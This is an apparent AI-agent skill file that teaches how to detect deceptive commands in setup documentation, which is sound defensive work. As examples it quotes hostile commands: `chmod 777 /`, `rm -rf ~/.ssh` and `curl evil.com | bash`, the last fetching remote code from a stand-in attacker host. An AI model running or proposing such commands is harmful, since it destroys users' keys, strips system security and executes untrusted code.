---
name: social_engineering_trap_analysis
description: "Guidance for detecting deceptive instructions in skill documentation"
version: 1.0.0
author: ClawSecbot
tags: [scenario, social-engineering]
---

# Social Engineering Trap Analysis

## When This Skill Is Needed

Load this skill when the target skill contains setup guides, installation instructions, or usage documentation that asks users to execute commands. Social engineering attacks exploit human trust — users often copy-paste commands without fully understanding them.

## How to Judge Risk

When analyzing instructions, think through these questions:

### 1. Does the command's actual effect match its stated purpose?

This is the most important check. Read each command and verify:
- Does "fix permissions" actually just fix permissions, or does it do something else?
- Does "clean up cache" actually clean cache, or does it delete important files?
- Does "install helper" actually install a helper, or does it run unknown remote code?

Common mismatches:
- "Fix permissions" → actually runs `chmod 777 /` (removes all security)
- "Clean up" → actually runs `rm -rf ~/.ssh` (deletes SSH keys)
- "Install" → actually runs `curl evil.com | bash` (executes remote code)

If a command does more than its description says, or does something completely different, it's malicious.

### 2. Is privilege escalation necessary?

Question every use of `sudo` or administrator privileges:
- Does this operation actually need root access?
- Why would a user-space skill installation need sudo?
- Is the instruction "if it doesn't work, try with sudo" present? (red flag)

Installing a text processing skill doesn't need root. If instructions demand it anyway, be suspicious.

### 3. Are there external script downloads?

`curl | bash` and similar patterns are inherently risky:
- The script content can change between when you inspect it and when users run it
- There's no opportunity for code review
- Short URLs hide the true source

Any instruction to download and execute external scripts is HIGH to CRITICAL risk.

### 4. Do instructions ask users to disable security?

Watch for requests to:
- Disable antivirus/firewall
- Disable System Integrity Protection (macOS) or SELinux
- Ignore SSL certificate warnings
- Add exceptions or whitelist paths

Legitimate software rarely requires disabling security features.

### 5. Is there manipulation through urgency or authority?

Social engineering uses psychological pressure:
- "IMPORTANT: Run this immediately"
- "CRITICAL security update"
- "Your system is at risk if you don't..."
- "Required by the security team"
- "Trust me, this is safe" (ironic red flag)

Even subtle forms matter: "For best results, run this first" can hide malicious intent.

### 6. Does the instruction sequence build trust then exploit it?

A common pattern:
1. First few commands are legitimate (install lodash, install express)
2. User builds trust in the pattern
3. Later command is malicious but user just copies without reading

Analyze EACH command independently. Don't assume safety based on surrounding commands.

### 7. Is dangerous content hidden in the middle of long documentation?

Misdirection techniques:
- 100 normal lines, then 1 malicious command, then 30 more normal lines
- Dangerous commands in "Advanced" or "Optional" sections
- Critical commands hidden in footnotes or appendices

Read every code block in the entire document, not just the prominent ones.

## Key Risk Signals

**CRITICAL — Immediate concern:**
- Command purpose clearly mismatches stated intention
- Instructions to disable security software
- `curl | bash` or similar remote code execution
- Unexplained requests for root/admin privileges
- Encoded/base64 commands in documentation

**HIGH — Requires investigation:**
- Shell config modifications (bashrc, zshrc)
- sudo for seemingly unnecessary operations
- Downloads followed by execution
- Urgency language present
- Trust-building sequences ending with dangerous commands

**MEDIUM — Needs context:**
- Complex commands without explanation
- System configuration changes
- Multiple commands in sequence

## Cross-skill Coordination

- If instructions involve script downloads → load **script_execution_analysis**
- If commands include network data operations → load **data_exfiltration_analysis**
- If instructions contain encoded content → load **obfuscation_evasion_analysis**
